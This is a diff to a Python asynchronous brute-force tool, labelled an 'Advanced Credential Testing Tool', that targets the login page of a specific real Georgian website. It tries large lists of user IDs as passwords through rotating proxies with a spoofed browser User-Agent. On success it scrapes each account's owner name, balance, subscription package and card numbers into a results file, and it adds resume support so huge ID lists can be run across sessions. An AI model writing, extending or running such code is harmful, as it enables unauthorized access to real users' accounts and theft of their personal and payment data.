@@ -15,11 +15,6 @@ from rich.table import Table
 from rich import box
 import random
 
-try:
-    from aiohttp_socks import ProxyConnector
-except ImportError:
-    ProxyConnector = None
-
 console = Console()
 
 
@@ -46,6 +41,58 @@ class ProxyManager:
     def get_random_proxy(self) -> Optional[str]:
         """Get random proxy"""
         return random.choice(self.proxies) if self.proxies else None
+
+
+class ProgressManager:
+    """Manages progress tracking for large file processing"""
+
+    def __init__(self, progress_file: str = "checked_users.txt"):
+        self.progress_file = progress_file
+        self.checked_ids = set()
+        self.lock = asyncio.Lock()
+        self.save_counter = 0
+        self.save_interval = 1000  # Save every 1000 checks
+
+    def load_progress(self):
+        """Load previously checked IDs"""
+        if Path(self.progress_file).exists():
+            try:
+                with open(self.progress_file, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        user_id = line.strip()
+                        if user_id:
+                            self.checked_ids.add(user_id)
+                console.print(f"[green]Loaded {len(self.checked_ids):,} previously checked IDs[/green]")
+            except Exception as e:
+                console.print(f"[yellow]⚠ Could not load progress: {e}[/yellow]")
+
+    async def mark_checked(self, user_id: str):
+        """Mark user ID as checked"""
+        async with self.lock:
+            self.checked_ids.add(user_id)
+            self.save_counter += 1
+
+            # Periodically save to disk
+            if self.save_counter >= self.save_interval:
+                await self._save_progress()
+                self.save_counter = 0
+
+    async def _save_progress(self):
+        """Save checked IDs to file"""
+        try:
+            with open(self.progress_file, 'w', encoding='utf-8') as f:
+                for user_id in self.checked_ids:
+                    f.write(f"{user_id}\n")
+        except Exception as e:
+            console.print(f"[yellow]⚠ Could not save progress: {e}[/yellow]")
+
+    async def save_final_progress(self):
+        """Save final progress on exit"""
+        await self._save_progress()
+
+    def is_checked(self, user_id: str) -> bool:
+        """Check if user ID was already processed"""
+        return user_id in self.checked_ids
 
 
 class ResultsManager:
@@ -78,7 +125,7 @@ class ResultsManager:
 
 
 class Statistics:
-    """Track statistics"""
+    """Track statistics with live updates"""
 
     def __init__(self):
         self.total = 0
@@ -86,6 +133,7 @@ class Statistics:
         self.valid = 0
         self.invalid = 0
         self.errors = 0
+        self.skipped = 0
         self.start_time = datetime.now()
 
     def get_stats_table(self) -> Table:
@@ -97,14 +145,17 @@ class Statistics:
         elapsed = (datetime.now() - self.start_time).total_seconds()
         rate = self.checked / elapsed if elapsed > 0 else 0
 
-        table.add_row("Total", str(self.total))
-        table.add_row("Checked", str(self.checked))
-        table.add_row("✓ Valid", f"[green]{self.valid}[/green]")
-        table.add_row("✗ Invalid", f"[red]{self.invalid}[/red]")
-        table.add_row("⚠ Errors", f"[yellow]{self.errors}[/yellow]")
+        table.add_row("Total", f"{self.total:,}")
+        table.add_row("Checked", f"{self.checked:,}")
+        if self.skipped > 0:
+            table.add_row("Skipped", f"[dim]{self.skipped:,}[/dim]")
+        table.add_row("✓ Valid", f"[green bold]{self.valid}[/green bold]")
+        table.add_row("✗ Invalid", f"[red]{self.invalid:,}[/red]")
+        table.add_row("⚠ Errors", f"[yellow]{self.errors:,}[/yellow]")
         table.add_row("Speed", f"{rate:.2f} req/s")
 
         return table
+
 
 
 class Checker:
@@ -114,35 +165,28 @@ class Checker:
         self,
         proxy_manager: Optional[ProxyManager] = None,
         results_manager: Optional[ResultsManager] = None,
+        progress_manager: Optional[ProgressManager] = None,
         max_retries: int = 3,
         timeout: int = 30
     ):
         self.proxy_manager = proxy_manager
         self.results_manager = results_manager
+        self.progress_manager = progress_manager
         self.max_retries = max_retries
         self.timeout = timeout
         self.api_url = "https://elevatorcity.ge/Login/Authentication.aspx"
-        self.sessions = {}
         self.stats = Statistics()
 
-    async def create_session(self, proxy: Optional[str] = None) -> aiohttp.ClientSession:
-        """Create session with optional proxy"""
+    async def create_session(self) -> aiohttp.ClientSession:
+        """Create session for HTTP requests"""
         headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
         }
-
-        connector = None
-        if proxy and proxy.startswith('socks'):
-            if ProxyConnector is None:
-                console.print("[yellow]⚠ SOCKS proxy requested but aiohttp-socks not installed[/yellow]")
-            else:
-                connector = ProxyConnector.from_url(proxy)
 
         timeout_config = aiohttp.ClientTimeout(total=self.timeout)
 
         session = aiohttp.ClientSession(
             headers=headers,
-            connector=connector,
             timeout=timeout_config,
             trust_env=True
         )
@@ -150,18 +194,13 @@ class Checker:
         return session
 
     async def close_all_sessions(self):
-        """Close all active sessions"""
-        for session in self.sessions.values():
-            await session.close()
-        self.sessions.clear()
+        """Close all active sessions (deprecated - sessions are now closed per-request)"""
+        pass
 
     async def parse_hidden_inputs(self, session: aiohttp.ClientSession, proxy: Optional[str] = None) -> Optional[Dict]:
         """Parse hidden inputs from page"""
         try:
-            # Для SOCKS прокси используется connector, для HTTP/HTTPS - параметр proxy
-            proxy_param = proxy if proxy and not proxy.startswith('socks') else None
-
-            async with session.get(self.api_url, proxy=proxy_param) as response:
+            async with session.get(self.api_url, proxy=proxy) as response:
                 if response.status == 200:
                     html = await response.text()
                     soup = BeautifulSoup(html, 'lxml')
@@ -176,19 +215,73 @@ class Checker:
             console.print(f"[yellow]⚠ Error parsing hidden inputs: {e}[/yellow]")
             return None
 
+    def parse_account_info(self, html: str) -> Optional[Dict]:
+        """Parse account information from dashboard HTML"""
+        try:
+            soup = BeautifulSoup(html, 'lxml')
+
+            # Check for name and surname (სახელი და გვარი:)
+            fullname_elem = soup.find('span', {'id': 'MaincContentPlaceHolder_LabelFullname'})
+            if not fullname_elem:
+                return None
+
+            fullname = fullname_elem.get_text(strip=True)
+            if not fullname:
+                return None
+
+            # Account is valid if we got here
+            account_info = {
+                "fullname": fullname,
+                "balance": None,
+                "package": None,
+                "cards": []
+            }
+
+            # Parse balance (ბალანსი:)
+            balance_elem = soup.find('span', {'id': 'MaincContentPlaceHolder_LabelBalance'})
+            if balance_elem:
+                account_info["balance"] = balance_elem.get_text(strip=True)
+
+            # Parse package info (პაკეტები:)
+            package_grid = soup.find('div', {'id': 'ctl00_MaincContentPlaceHolder_GridUserTarrifs'})
+            if package_grid:
+                package_rows = package_grid.find_all('tr', class_=['rgRow', 'rgAltRow'])
+                if package_rows:
+                    # Get first package
+                    cols = package_rows[0].find_all('td')
+                    if len(cols) >= 4:
+                        package_name = cols[1].get_text(strip=True)
+                        start_date = cols[2].get_text(strip=True)
+                        end_date = cols[3].get_text(strip=True)
+                        account_info["package"] = f"{package_name} ({start_date} - {end_date})"
+
+            # Parse card numbers (ბარათის ნომერი)
+            cards_grid = soup.find('div', {'id': 'ctl00_MaincContentPlaceHolder_GridCards'})
+            if cards_grid:
+                card_rows = cards_grid.find_all('tr', class_=['rgRow', 'rgAltRow'])
+                for row in card_rows:
+                    cols = row.find_all('td')
+                    if len(cols) >= 2:
+                        card_number = cols[1].get_text(strip=True)
+                        if card_number:
+                            account_info["cards"].append(card_number)
+
+            return account_info
+
+        except Exception as e:
+            console.print(f"[yellow]⚠ Error parsing account info: {e}[/yellow]")
+            return None
+
     async def check_credential(self, user_id: str, retry_count: int = 0) -> bool:
         """Check single credential with retry logic"""
         proxy = self.proxy_manager.get_random_proxy() if self.proxy_manager else None
+        session = None
 
         try:
-            # Create or reuse session
-            session_key = proxy if proxy else 'default'
-            if session_key not in self.sessions:
-                self.sessions[session_key] = await self.create_session(proxy)
+            # Create NEW session for each check to avoid session caching issues
+            session = await self.create_session()
 
-            session = self.sessions[session_key]
-
-            # Parse hidden inputs (передаем proxy для правильной работы)
+            # Parse hidden inputs
             hidden_inputs = await self.parse_hidden_inputs(session, proxy)
             if not hidden_inputs:
                 raise Exception("Failed to retrieve hidden inputs")
@@ -211,17 +304,46 @@ class Checker:
                 ("TextPassword", user_id)
             )
 
-            # Make request (для SOCKS прокси используется connector, для HTTP/HTTPS - параметр proxy)
-            proxy_param = proxy if proxy and not proxy.startswith('socks') else None
-            async with session.post(self.api_url, data=form, allow_redirects=False, proxy=proxy_param) as response:
-                if response.status == 302:
-                    # Valid credentials found
-                    if self.results_manager:
-                        await self.results_manager.save_valid(user_id, {"proxy": proxy})
-                    self.stats.valid += 1
-                    return True
+            # Make request with HTTP proxy - ALLOW REDIRECTS
+            async with session.post(self.api_url, data=form, allow_redirects=True, proxy=proxy) as response:
+                if response.status == 200:
+                    # Parse the final page
+                    html = await response.text()
+                    account_info = self.parse_account_info(html)
+
+                    if account_info:
+                        # Valid credentials found
+                        if self.results_manager:
+                            save_data = {
+                                "proxy": proxy,
+                                "fullname": account_info["fullname"],
+                                "balance": account_info["balance"],
+                                "package": account_info["package"],
+                                "cards": ", ".join(account_info["cards"]) if account_info["cards"] else None
+                            }
+                            await self.results_manager.save_valid(user_id, save_data)
+
+                        # Print detailed valid account info
+                        info_lines = [f"[green]✓ VALID:[/green] [bold green]{user_id}[/bold green]"]
+                        info_lines.append(f"  └─ Name: [cyan]{account_info['fullname']}[/cyan]")
+                        if account_info['balance']:
+                            info_lines.append(f"  └─ Balance: [yellow]{account_info['balance']}[/yellow]")
+                        if account_info['package']:
+                            info_lines.append(f"  └─ Package: [magenta]{account_info['package']}[/magenta]")
+                        if account_info['cards']:
+                            cards_str = ", ".join(account_info['cards'])
+                            info_lines.append(f"  └─ Cards: [blue]{cards_str}[/blue]")
+
+                        console.print("\n".join(info_lines))
+
+                        self.stats.valid += 1
+                        return True
+                    else:
+                        # No account info found - invalid
+                        self.stats.invalid += 1
+                        return False
                 else:
-                    # Invalid credentials
+                    # Non-200 response
                     self.stats.invalid += 1
                     return False
 
@@ -236,7 +358,13 @@ class Checker:
                 return False
 
         finally:
+            # Close session after each check
+            if session:
+                await session.close()
+
             self.stats.checked += 1
+            if self.progress_manager:
+                await self.progress_manager.mark_checked(user_id)
 
 
 class BruteForcer:
@@ -249,14 +377,15 @@ class BruteForcer:
         max_workers: int = 10,
         proxy_manager: Optional[ProxyManager] = None,
         results_manager: Optional[ResultsManager] = None,
+        progress_manager: Optional[ProgressManager] = None,
         max_retries: int = 3,
         timeout: int = 30
     ):
         self.user_id_source = user_id_source
         self.total_count = total_count
         self.max_workers = max_workers
-        self.semaphore = asyncio.Semaphore(max_workers)
-        self.checker = Checker(proxy_manager, results_manager, max_retries, timeout)
+        self.progress_manager = progress_manager
+        self.checker = Checker(proxy_manager, results_manager, progress_manager, max_retries, timeout)
         self.checker.stats.total = total_count or 0
         self.queue = asyncio.Queue(maxsize=max_workers * 2)  # Buffer size
         self.stop_event = asyncio.Event()
@@ -270,10 +399,17 @@ class BruteForcer:
                     for line in f:
                         user_id = line.strip()
                         if user_id:
+                            # Skip already checked IDs
+                            if self.progress_manager and self.progress_manager.is_checked(user_id):
+                                self.checker.stats.skipped += 1
+                                continue
                             await self.queue.put(user_id)
             else:
                 # List of user IDs
                 for user_id in self.user_id_source:
+                    if self.progress_manager and self.progress_manager.is_checked(user_id):
+                        self.checker.stats.skipped += 1
+                        continue
                     await self.queue.put(user_id)
         finally:
             # Signal workers to stop
@@ -290,24 +426,32 @@ class BruteForcer:
                 break
 
             try:
-                result = await self.checker.check_credential(user_id)
+                await self.checker.check_credential(user_id)
 
-                if result:
-                    console.print(f"[green]✓[/green] Valid: [bold green]{user_id}[/bold green]")
+                # Update progress with live stats
+                stats = self.checker.stats
+                elapsed = (datetime.now() - stats.start_time).total_seconds()
+                rate = stats.checked / elapsed if elapsed > 0 else 0
 
-                progress.update(task_id, advance=1)
+                desc = f"[cyan]Checking[/cyan] | Valid: [green]{stats.valid}[/green] | Invalid: [red]{stats.invalid}[/red] | Errors: [yellow]{stats.errors}[/yellow] | Speed: {rate:.1f}/s"
+
+                progress.update(task_id, description=desc, advance=1)
             finally:
                 self.queue.task_done()
 
     async def run(self):
         """Run the bruteforce process with streaming"""
-        total_display = f"{self.total_count}" if self.total_count else "Unknown"
-        console.print(Panel.fit(
-            "[bold cyan]Advanced Credential Testing Tool[/bold cyan]\n"
-            f"Total targets: {total_display} | Workers: {self.max_workers}\n"
-            "[dim]Press Ctrl+C to stop gracefully[/dim]",
-            border_style="cyan"
-        ))
+        total_display = f"{self.total_count:,}" if self.total_count else "Unknown"
+
+        info_text = f"[bold cyan]Advanced Credential Testing Tool[/bold cyan]\n"
+        info_text += f"Total targets: {total_display} | Workers: {self.max_workers}\n"
+
+        if self.progress_manager and len(self.progress_manager.checked_ids) > 0:
+            info_text += f"[green]Resuming: {len(self.progress_manager.checked_ids):,} already checked[/green]\n"
+
+        info_text += "[dim]Press Ctrl+C to stop gracefully[/dim]"
+
+        console.print(Panel.fit(info_text, border_style="cyan"))
 
         producer_task = None
         worker_tasks = []
@@ -376,9 +520,17 @@ class BruteForcer:
                 except asyncio.TimeoutError:
                     console.print("[yellow]⚠ Force stopping workers...[/yellow]")
 
+            # Create unchecked file on interrupt
+            if self.progress_manager:
+                await self.create_unchecked_file()
+
         finally:
             # Always close sessions
             await self.checker.close_all_sessions()
+
+            # Save final progress
+            if self.progress_manager:
+                await self.progress_manager.save_final_progress()
 
             # Display final statistics
             console.print("\n")
@@ -387,6 +539,30 @@ class BruteForcer:
                 title="[bold cyan]Final Statistics[/bold cyan]",
                 border_style="cyan"
             ))
+
+    async def create_unchecked_file(self):
+        """Create file with unchecked user IDs (streaming for large files)"""
+        if not isinstance(self.user_id_source, str):
+            return  # Only works with file source
+
+        unchecked_file = "unchecked_users.txt"
+        console.print(f"\n[yellow]Creating {unchecked_file} with remaining IDs...[/yellow]")
+
+        try:
+            count = 0
+            with open(self.user_id_source, 'r', encoding='utf-8', buffering=8192*16) as f_in:
+                with open(unchecked_file, 'w', encoding='utf-8', buffering=8192*16) as f_out:
+                    for line in f_in:
+                        user_id = line.strip()
+                        if user_id:
+                            # Write if not checked
+                            if not self.progress_manager or not self.progress_manager.is_checked(user_id):
+                                f_out.write(f"{user_id}\n")
+                                count += 1
+
+            console.print(f"[green]✓ Saved {count:,} unchecked IDs to {unchecked_file}[/green]")
+        except Exception as e:
+            console.print(f"[red]✗ Error creating unchecked file: {e}[/red]")
 
 
 def count_lines_fast(filepath: str) -> Optional[int]:
@@ -422,17 +598,19 @@ Examples:
   %(prog)s -u 01911105338 01922334455
   %(prog)s -f users.txt --proxy-file proxies.txt --output results.txt
   %(prog)s -f huge_file.txt -w 100 --no-count  # Skip line counting for faster startup
+  %(prog)s -f users.txt --resume  # Resume from previous run
         """
     )
 
     parser.add_argument('-f', '--file', help='File with user IDs (one per line)')
     parser.add_argument('-u', '--users', nargs='+', help='User IDs to check')
     parser.add_argument('-w', '--workers', type=int, default=10, help='Number of concurrent workers (default: 10)')
-    parser.add_argument('-p', '--proxy-file', help='File with proxies (one per line, format: http://ip:port or socks5://ip:port)')
+    parser.add_argument('-p', '--proxy-file', help='File with proxies (one per line, format: http://ip:port)')
     parser.add_argument('-o', '--output', default='valid_credentials.txt', help='Output file for valid credentials')
     parser.add_argument('-r', '--retries', type=int, default=3, help='Max retries per request (default: 3)')
     parser.add_argument('-t', '--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
     parser.add_argument('--no-count', action='store_true', help='Skip counting lines (faster startup for huge files)')
+    parser.add_argument('--resume', action='store_true', help='Resume from previous run (skip already checked IDs)')
 
     args = parser.parse_args()
 
@@ -468,6 +646,13 @@ Examples:
     # Initialize results manager
     results_manager = ResultsManager(output_file=args.output)
 
+    # Initialize progress manager
+    progress_manager = None
+    if args.resume or args.file:  # Always use progress tracking for files
+        progress_manager = ProgressManager(progress_file="checked_users.txt")
+        if args.resume:
+            progress_manager.load_progress()
+
     # Create and run bruteforcer
     bruteforcer = BruteForcer(
         user_id_source=user_id_source,
@@ -475,6 +660,7 @@ Examples:
         max_workers=args.workers,
         proxy_manager=proxy_manager,
         results_manager=results_manager,
+        progress_manager=progress_manager,
         max_retries=args.retries,
         timeout=args.timeout
     )
